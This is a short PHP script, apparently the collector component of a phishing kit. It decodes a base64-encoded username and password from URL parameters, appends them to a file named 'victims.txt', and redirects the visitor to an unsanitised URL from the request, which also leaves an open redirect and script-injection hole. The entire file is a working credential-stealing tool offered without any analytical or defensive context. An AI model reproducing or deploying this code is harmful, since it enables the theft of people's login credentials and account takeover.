<?php

$user = base64_decode($_GET['id']);
$pass = base64_decode($_GET['locid']);
$f = fopen('victims.txt','a+');
fwrite($f,$user."<!:!>".$pass);
fclose($f);
echo '<script>window.location = "'.$_GET['redir'].'" </script>';

?>